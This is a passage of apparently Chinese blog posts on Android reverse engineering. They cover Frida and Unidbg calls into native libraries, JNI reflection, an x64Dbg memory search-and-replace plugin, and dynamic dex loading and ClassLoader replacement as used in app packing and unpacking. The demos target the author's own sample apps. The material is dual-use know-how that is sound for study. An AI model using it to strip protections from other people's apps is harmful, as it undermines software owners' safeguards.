env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } 开始调用: 下述代码,用来示例抽取原Apk的so库,用Frida直接来调用其中的方法. function main(){ Java.perform(function(){ var module_luomd5 = Module.load(\"/data/app/libluodst.so\"); var mdString_address = module_luomd5.findExportByName(\"Java_com_example_luodst_MainActivity_mdString\"); console.log(\"mdString_address: \", mdString_address) var mdString = new NativeFunction(mdString_address, \"pointer\", [\"pointer\", \"pointer\", \"pointer\"]); var env = Java.vm.getEnv(); //mdString是个静态Native函数 var result = mdString(env, NULL, env.newStringUtf(\"Hello XiaLuoHun!\")) console.log(\"result: \", env.getStringUtfChars(result, NULL).readCString()) }) } setImmediate(main); frida -U com.android.settings -l .\\LuoHook.js ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:1","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"Unidbg Unidbg是一个基于Unicorn的逆向工具,可以直接调用Android和iOS中的so文件. https://github.com/zhkl0228/unidbg 测试 将Unidbg整个项目下载下来,用IDEA打开,运行其中一个测试项目,若能正常输出,则配置正确. 调用so中的静态方法 准备一个so文件: Java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; String strSample = \"Hello XiaLuoHun!\"; tv.setText(\"mdString: \" + mdString(strSample)); } public static native String mdString(String string); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"md5.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } 模拟调用: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { long start = System.currentTimeMillis(); MainActivity mainActivity = new MainActivity(); System.out.println(\"load offset=\" + (System.currentTimeMillis() - start) + \"ms\"); mainActivity.crack(); } private final AndroidEmulator emulator; private final VM vm; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(new File(\"unidbg-android/src/test/java/com/example/luodst/files/libluodst.so\"), false); //8.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void crack() { //9.执行JNI方法 //示例 DvmClass dvmClass = vm.resolveClass(\"com/example/luodst/MainActivity\"); DvmObject result1 = dvmClass.callStaticJniMethodObject(emulator, \"mdString(Ljava/lang/String;)Ljava/lang/String;\", \"Hello XiaLuoHun!\"); System.out.println(\"result1 =\u003e \" + result1.getValue()); } } 调用so中的实例方法-无java方法 准备一个so文件: Java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(\"LuoAdd: \" + LuoAdd(10, 20)); } public native int LuoAdd(int n1, int n2); } Native: #include \u003cjni.h\u003e #include \u003cstring\u003e ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:5:2","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"反射 可以从下述源码进行学习 GravityBox Java层: package com.example.luomd5; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.widget.TextView; import com.example.luomd5.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luomd5' library on application startup. static { System.loadLibrary(\"luomd5\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; String strSample = \"XiaLuoHun\"; String str = \"mdString: \" + mdString(strSample) + \"\\n\" + \"Javamd5: \" + Javamd5(strSample) + \"\\n\" + \"Refmd5: \" + Refmd5(strSample) + \"\\n\" + \"Refmd5Sec: \" + Refmd5Sec(strSample); tv.setText(str); } public String Javamd5(String string) { if (TextUtils.isEmpty(string)) { return \"\"; } MessageDigest md5 = null; try { md5 = MessageDigest.getInstance(\"MD5\"); byte[] bytes = md5.digest(string.getBytes()); StringBuilder result = new StringBuilder(); for (byte b : bytes) { String temp = Integer.toHexString(b \u0026 0xff); if (temp.length() == 1) { temp = \"0\" + temp; } result.append(temp); } return result.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } return \"\"; } public static native String mdString(String string); public native String Refmd5(String string); public native String Refmd5Sec(String string); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"md5.h\" __attribute__ ((visibility(\"hidden\"))) jstring JNICALL LuoDynamicNative(JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++ LuoHun\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_mdString(JNIEnv *env, jclass clazz, jstring string) { const char *szString = env-\u003eGetStringUTFChars(string, NULL); std::string strMd5 = MD5(szString).toStr(); return env-\u003eNewStringUTF(strMd5.c_str()); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_Refmd5(JNIEnv *env, jobject thiz, jstring string) { //md5 = MessageDigest.getInstance(\"MD5\"); jclass clsMessageDigest = env-\u003eFindClass(\"java/security/MessageDigest\"); jmethodID getInstance = env-\u003eGetStaticMethodID(clsMessageDigest, \"getInstance\", \"(Ljava/lang/String;)Ljava/security/MessageDigest;\"); jstring strMD5 = env-\u003eNewStringUTF(\"MD5\"); jobject objMD5 = env-\u003eCallStaticObjectMethod(clsMessageDigest, getInstance, strMD5); //byte[] bytes = md5.digest(string.getBytes()); jclass clsString = env-\u003eFindClass(\"java/lang/String\"); jmethodID getBytes = env-\u003eGetMethodID(clsString, \"getBytes\", \"()[B\"); jbyteArray jbAry = (jbyteArray) env-\u003eCallObjectMethod(string, getBytes); jmethodID digest = env-\u003eGetMethodID(clsMessageDigest, \"digest\", \"([B)[B\"); jbyteArray jbAryResult = (jbyteArray) env-\u003eCallObjectMethod(objMD5, digest, jbAry); char *cmd5 = reinterpret_cast\u003cchar *\u003e(env-\u003eGetByteArrayElements(jbAryResult, 0)); int i; char dest[32] = {0}; for (i = 0; i \u003c 16; i++) { sprintf(dest + i * 2, \"%02x\", (unsigned int) cmd5[i]); } return env-\u003eNewStringUTF(dest); } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luomd5_MainActivity_Refmd5Sec(JNIEnv *env, jobject thiz, jstring string) { jclass clsMainActivity = env-\u003eFindClass(\"com/example/luomd5/MainActivity\"); jmethodID Javamd5 = env-\u003eGetMethodID(clsMainActivity, \"Javamd5\", \"(Ljava/lang/String;)Ljava/lang/String;\"); jstring strMd5 = (jstring) env-\u003eCallObjectMethod(thiz, Javamd5, string); return strMd5; } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:6:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"OnCreate函数Native化 Java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.LayoutInflater; import android.view.View; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; /* @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); }*/ protected native void onCreate(Bundle savedInstanceState); /** * A native method that is implemented by the 'luodst' native library, * which is packaged with this application. */ public native String stringFromJNI(); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT void JNICALL Java_com_example_luodst_MainActivity_onCreate(JNIEnv *env, jobject thiz, jobject saved_instance_state) { //super.onCreate(savedInstanceState); //方式一 jclass clsAppCompatActivity1 = env-\u003eFindClass(\"androidx/appcompat/app/AppCompatActivity\"); //方式二 jclass clsMainActivity = env-\u003eGetObjectClass(thiz); jclass clsAppCompatActivity2 = env-\u003eGetSuperclass(clsMainActivity); jmethodID onCreate = env-\u003eGetMethodID(clsAppCompatActivity1, \"onCreate\", \"(Landroid/os/Bundle;)V\"); //调用父类方法 env-\u003eCallNonvirtualVoidMethod(thiz, clsAppCompatActivity1, onCreate, saved_instance_state); //binding = ActivityMainBinding.inflate(getLayoutInflater()); jmethodID getLayoutInflater = env-\u003eGetMethodID(clsMainActivity, \"getLayoutInflater\", \"()Landroid/view/LayoutInflater;\"); jclass clsActivityMainBinding = env-\u003eFindClass( \"com/example/luodst/databinding/ActivityMainBinding\"); jmethodID inflate = env-\u003eGetStaticMethodID(clsActivityMainBinding, \"inflate\", \"(Landroid/view/LayoutInflater;)Lcom/example/luodst/databinding/ActivityMainBinding;\"); jobject jbinding = env-\u003eCallStaticObjectMethod(clsActivityMainBinding, inflate, env-\u003eCallObjectMethod(thiz, getLayoutInflater)); //setContentView(binding.getRoot()); jmethodID getRoot = env-\u003eGetMethodID(clsActivityMainBinding, \"getRoot\", \"()Landroid/view/View;\"); jmethodID setContentView = env-\u003eGetMethodID(clsMainActivity, \"setContentView\", \"(Landroid/view/View;)V\"); env-\u003eCallVoidMethod(thiz, setContentView, env-\u003eCallObjectMethod(jbinding, getRoot)); //TextView tv = binding.sampleText; jfieldID sampleText = env-\u003eGetFieldID(clsActivityMainBinding, \"sampleText\", \"Landroid/widget/TextView;\"); jobject tv = env-\u003eGetObjectField(jbinding, sampleText); //tv.setText(stringFromJNI()); jclass clsTextView = env-\u003eFindClass(\"android/widget/TextView\"); jmethodID setText = env-\u003eGetMethodID(clsTextView, \"setText\", \"(Ljava/lang/CharSequence;)V\"); jmethodID stringFromJNI = env-\u003eGetMethodID(clsMainActivity, \"stringFromJNI\", \"()Ljava/lang/String;\"); env-\u003eCallVoidMethod(tv, setText, env-\u003eCallObjectMethod(thiz, stringFromJNI)); } ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:7:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["Android基础"],"content":"参考链接 Android JNI(一)——NDK与JNI基础 Unidbg文档更新(一) Unidbg文档慢更(二) Java高级特性——反射 Android JNI学习(四)——JNI的常用方法的中文API ","date":"2021-12-28","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/:8:0","tags":["Android"],"title":"NDK进阶","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E8%BF%9B%E9%98%B6/"},{"categories":["x64Dbg"],"content":"在编写x64Dbg插件时用到以下两个函数,有坑! SCRIPT_EXPORT duint FindMem(duint start, duint size, const char* pattern); SCRIPT_EXPORT bool SearchAndReplaceMem(duint start, duint size, const char* searchpattern, const char* replacepattern); 首先SearchAndReplaceMem只会在start开始的size大小范围内只替换一次,所以要结合FindMem来完成全部的替换. 当FindMem查找的地址范围过大时,第二次查找会失败(示例中的Size为0x0000000040000000),出现下述错误. 正确的写法如下: DWORD WINAPI workThreadProc(_In_ LPVOID lpParameter) { duint dSelDisasmAddr = Script::Gui::Disassembly::SelectionGetStart(); duint dSelBase = Script::Memory::GetBase(dSelDisasmAddr); duint dSelSize = Script::Memory::GetSize(dSelDisasmAddr); char searchpattern[] = \"48656C6C6F205869614C756F48756E2100\"; char replacepattern[] = \"48656C6C6F20576F726C642100\"; duint nSearchpatternLen = strlen(searchpattern) + 1; duint dStartAddr = dSelBase; do { duint dAddr = Script::Pattern::FindMem(dStartAddr, dSelSize + dSelBase - dStartAddr, searchpattern); if (dAddr == -1 || dAddr == 0) { break; } dStartAddr = dAddr + 1; if (!Script::Pattern::SearchAndReplaceMem(dAddr, nSearchpatternLen, searchpattern, replacepattern)) { break; } Sleep(10); } while (true); ::MessageBox(NULL, \"Done\", \"replaceMemory\", MB_OK); return 0; } ","date":"2021-12-27","objectID":"/posts/x64dbg/x64dbg%E4%B9%8Bsearchandreplacemem/:0:0","tags":["x64Dbg"],"title":"x64Dbg之SearchAndReplaceMem","uri":"/posts/x64dbg/x64dbg%E4%B9%8Bsearchandreplacemem/"},{"categories":["Android壳世界"],"content":"目前市场上不加壳的App很少见,可以说要想完成对一个App的逆向分析,脱壳是第一步! ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:0:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"ClassLoader ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"JVM的类加载器 三种类加载器: Bootstrap ClassLoader(引导类加载器) C/C++代码实现的加载器,用于加载指定JDK的核心类库,比如java.lang、java.uti等这些系统类.Java虚拟机的启动就是通过Bootstrap,该ClassLoader在java里无法获取,负责加载/lib下的类. Extensions ClassLoader(拓展类加载器) Java中的实现类为ExtClassLoader,提供除了系统类之外的额外功能,可以在java里获取,负责加载/lib/ext下的类. Application ClassLoader(应用程序类加载器) Java中的实现类为AppClassLoader,是与我们接触最多的类加载器,开发人员写的代码默认就是由它来加载,ClassLoader.getSystemClassLoader返回的就是它. 继承关系: 可以自定义类加载器,只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可. 双亲委派: 双亲委派模式的工作原理:如果一个类加载器收到了类加载请求,它并不会自己先去加载,而是把这个请求委托给父类的加载器去执行,如果父类加载器还存在其父类加载器,则进一步向上委托,依次递归,请求最终将到达顶层的启动类加载器,如果父类加载器可以完成类加载任务,就成功返回,倘若父类加载器无法完成此加载任务,子加载器才会尝试自己去加载,这就是双亲委派模式.即每个儿子都不愿意干活,每次有活都丢给父亲去干,直到父亲说这件事我也干不了时,儿子自己想办法去完成,这个就是双亲委派. 优点: 避免重复加载,如果已经加载过一次Class,可以直接读取已经加载的Class. 更加安全,无法自定义类来替代系统的类,可以防止核心API库被随意篡改. 类加载时机: 隐式加载: 创建类的实例. 访问类的静态变量,或者为静态变量赋值. 调用类的静态方法. 使用反射方式来强制创建某个类或接口对应的java.lang.Class对象. 初始化某个类的子类. 显式加载: 使用LoadClass()加载. 使用forName()加载. 类装载流程: 装载,查找和导入Class文件. 链接,其中解析步骤是可以选择的. 检查,检查载入的class文件数据的正确性. 准备,给类的静态变量分配存储空间. 解析,将符号引用转成直接引用. 初始化,即调用函数,对静态变量,静态代码块执行初始化工作. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"Android的类加载器 继承关系: 上图为Android系统中的ClassLoader的继承关系图,其中InMemoryDexClassLoader为Android8.0新引入的ClassLoader ClassLoader: 为抽象类. BootClassLoader: 预加载常用类,单例模式.与Java中的BootClassLoader不同,它并不是由C/C++代码实现,而是由Java实现的. BaseDexClassLoader: 是InMemoryDexClassLoader、PathClassLoader、DexClassLoader的父类.类加载的主要逻辑都是在BaseDexClassLoader完成的. SecureClassLoader: 继承了抽象类ClassLoader,扩展了ClassLoader类加入了权限方面的功能,加强了安全性,其子类URLClassLoader是用URL路径从jar文件中加载类和资源. InMemoryDexClassLoader: Android8.0新引入的,可以直接从内存中加载dex. PathClassLoader: 是Android默认使用的类加载器,一个apk中的Activity等类便是在其中加载. DexClassLoader: 可以加载任意目录下的dex/jar/apk/zip文件,比PathClassLoader更灵活,是实现插件化、热修复以及dex加壳的重点. 源码分析: 每个ClassLoader在构造时都会传一个父ClassLoader,遵循双亲委派机制.下图以PathClassLoader为例. 代码验证: 本次主要验证Activity是否由PathClassLoader加载,以及双亲委派机制. package org.example.luoclassloader; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; public class MainActivity extends AppCompatActivity { private final String TAG = \"[LuoHun] \"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); tstClassLoader(); } void tstClassLoader() { ClassLoader thisClassLoader = MainActivity.class.getClassLoader(); Log.d(TAG, \"app: \" + thisClassLoader); ClassLoader parentClassLoader = thisClassLoader.getParent(); while (parentClassLoader != null) { Log.d(TAG, \"this: \" + thisClassLoader + \" --\u003eparent: \" + parentClassLoader); thisClassLoader = parentClassLoader; parentClassLoader = thisClassLoader.getParent(); } Log.d(TAG, \"root: \" + thisClassLoader); } } 上述代码输出结果如下: app : dalvik.system.PathClassLoader this: dalvik.system.PathClassLoader --\u003eparent: java.lang.BootClassLoader root: java.lang.BootClassLoader ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:1:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"动态加载示例 本次主要使用DexClassLoader,实现一个简单的动态加载Dex文件,并调用其中的某个方法. 用As建立一个空工程,新建一个类,写一个测试方法. package org.example.luodst; import android.util.Log; public class LuoTst { private final String TAG = \"[LuoHun] \"; public void fun1() { Log.d(TAG, \"org.example.luodst.fun1\"); } } 编译上述工程,从apk中提取出Dex文件,传到手机的临时目录中. adb push classes.dex /data/local/tmp 用As建立另一个工程,来加载上述Dex文件,并调用上述的测试函数fun1. package org.example.luoloaddex; import androidx.appcompat.app.AppCompatActivity; import android.content.Context; import android.os.Bundle; import android.widget.TextView; import java.io.File; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Context appContext = getApplicationContext(); //org.example.luodst.LuoTst tstDexClassLoader(appContext, \"/data/local/tmp/classes.dex\"); } public void tstDexClassLoader(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); /* 参数一: String dexPath, Dex文件路径 参数二: String optimizedDirectory, Dex优化目录 Android中内存中不会出现上述参数一的Dex文件, 会先优化,然后运行,优化后为.odex文件 参数三: String librarySearchPath, 库搜索路径,jni有so文件 参数四: ClassLoader parent, 类加载器 * */ DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), MainActivity.class.getClassLoader()); Class\u003c?\u003e clazz = null; try { clazz = dexClassLoader.loadClass(\"org.example.luodst.LuoTst\"); if (clazz != null) { try { Object obj = clazz.newInstance(); Method func1Method = clazz.getDeclaredMethod(\"fun1\"); func1Method.invoke(obj); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } } } catch (ClassNotFoundException e) { e.printStackTrace(); } } } ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:2:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"加壳App运行流程 ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"App启动流程 通过Zygote进程到最终进入到app进程世界，我们可以看到ActivityThread.main()是进入App世界的大门. 下面列出ActivityThread这个类中比较重要的成员和字段. public final class ActivityThread { //保存创建的ActivityThread实例. private static volatile ActivityThread sCurrentActivityThread; //LoadedApk中有mClassLoader成员,即PathClassLoader,App运行过程中用于加载相关四大组件类的ClassLoader final ArrayMap\u003cString, WeakReference\u003cLoadedApk\u003e\u003e mPackages = new ArrayMap\u003c\u003e(); //用于获取当前虚拟机创建的ActivityThread实例. public static ActivityThread currentActivityThread() { return sCurrentActivityThread; } //--- } ActivityThread.main()函数是java中的入口main函数,这里会启动主消息循环,并创建ActivityThread实例,之后调用thread.attach(false)完成一系列初始化准备工作,并完成全局静态变量sCurrentActivityThread的初始化.之后主线程进入消息循环,等待接收来自系统的消息.当收到系统发送来的bindapplication的进程间调用时,调用函数handlebindapplication来处理该请求. private void handleBindApplication(AppBindData data) { //step 1: 创建LoadedApk对象 data.info = getPackageInfoNoCheck(data.appInfo, data.compatInfo); ... //step 2: 创建ContextImpl对象; final ContextImpl appContext = ContextImpl.createAppContext(this, data.info); //step 3: 创建Instrumentation mInstrumentation = new Instrumentation(); //step 4: 创建Application对象;在makeApplication函数中调用了newApplication，在该函数中又调用了app.attach(context)，在attach函数中调用了Application.attachBaseContext函数 Application app = data.info.makeApplication(data.restrictedBackupMode, null); mInitialApplication = app; //step 5: 安装providers List\u003cProviderInfo\u003e providers = data.providers; installContentProviders(app, providers); //step 6: 执行Application.Create回调 mInstrumentation.callApplicationOnCreate(app); 在handleBindApplication函数中第一次进入了app的代码世界,该函数功能是启动一个application,并把系统收集的apk组件等相关信息绑定到application里,在创建完application对象后,接着调用了application的attachBaseContext方法,之后调用了application的onCreate函数.由此可以发现,app的Application类中的attachBaseContext和onCreate这两个函数是最先获取执行权进行代码执行的.这也是为什么各家的加固工具的主要逻辑都是通过替换app入口Application,并自实现这两个函数,在这两个函数中进行代码的脱壳以及执行权交付的原因. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"App运行流程 ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"加壳应用的运行流程 当壳在函数attachBaseContext和onCreate中执行完加密的Dex文件的解密后,通过自定义的ClassLoader在内存中加载解密后的Dex文件.为了解决后续应用在加载执行解密后的dex文件中的Class和Method的问题,接下来就是通过利用java的反射修复一系列的变量.其中最为重要的一个变量就是应用运行中的ClassLoader,只有ClassLoader被修正后,应用才能够正常的加载并调用Dex中的类和方法,否则的话由于ClassLoader的双亲委派机制,最终会报ClassNotFound异常,应用崩溃退出,这是加固厂商不愿意看到的.由此可见ClassLoader是一个至关重要的变量,所有应用中加载的Dex文件最终都在应用的ClassLoader中. 因此,只要获取到加固应用最终通过反射设置后的ClassLoader,我们就可以通过一系列反射最终获取到当前应用所加载的解密后的内存中的Dex文件. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:3","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"生命周期类处理 DexClassLoader加载的类是没有组件生命周期的,也就是说即使DexClassLoader通过对Apk的的动态加载完成了对组件类的加载,但是当系统启动该组件时,依然会出现类失败的异常. 解决方案: 此时有两种解决方案: 替换系统组件类加载器为我们的DexClassLoader,同时设置DexClassLoader的parent为系统组件类加载器. 打破原有的双亲关系,在系统组件类加载器和BootClassLoader的中间插入我们自己的DexClassLoader即可. 代码实现: 用As建立一个空工程,新建一个类,写一个测试Activity. package org.example.luodst; import android.app.Activity; import android.os.Bundle; import android.util.Log; import androidx.appcompat.app.AppCompatActivity; public class LuoTstActivity extends Activity { private final String TAG = \"[LuoHun] \"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Log.d(TAG, \"org.example.luodst.LuoTstActivity onCreate\"); } } 编译上述工程,从apk中提取出Dex文件,传到手机的临时目录中. adb push classes.dex /data/local/tmp 方案一: 用As建立另一个工程,来加载上述Dex文件,使用方案一处理Activity. package org.example.luoloaddex; import android.app.Activity; import android.content.Context; import android.content.Intent; import android.os.Bundle; import android.util.ArrayMap; import java.io.File; import java.lang.ref.WeakReference; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Context appContext = getApplicationContext(); startTstActivityFirstMethod(appContext, \"/data/local/tmp/classes.dex\"); } public void startTstActivityFirstMethod(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), MainActivity.class.getClassLoader()); replaceClassLoader(dexClassLoader); Class\u003c?\u003e clazz = null; try { clazz = dexClassLoader.loadClass(\"org.example.luodst.LuoTstActivity\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } context.startActivity(new Intent(context, clazz)); } public void replaceClassLoader(ClassLoader classLoader) { try { //ActivityThread类中有一个静态方法currentActivityThread可以获取当前虚拟机创建的ActivityThread实例. Class\u003c?\u003e ActivityThreadClazz = classLoader.loadClass(\"android.app.ActivityThread\"); Method currentActivityThread = ActivityThreadClazz.getDeclaredMethod(\"currentActivityThread\"); 